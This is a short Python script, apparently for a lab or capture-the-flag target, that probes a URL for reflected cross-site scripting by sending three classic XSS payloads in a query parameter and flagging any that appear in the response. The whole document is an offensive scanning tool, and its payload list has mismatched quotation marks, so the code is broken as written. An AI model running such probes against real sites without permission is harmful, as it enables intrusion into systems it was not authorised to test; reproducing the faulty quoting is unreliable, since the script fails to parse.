#!/usr/bin/env python3
import requests

def scan_xss(target):
    payloads = ['<script>alert(1)</script>', 
                '"<img src=x onerror=alert(1)>", 
                "'><svg onload=alert(1)>"]
    for payload in payloads:
        resp = requests.get(f"{target}?q={payload}")
        if payload in resp.text:
            print(f"🔥 XSS VULN: {payload}")

scan_xss("http://10.10.10.x")
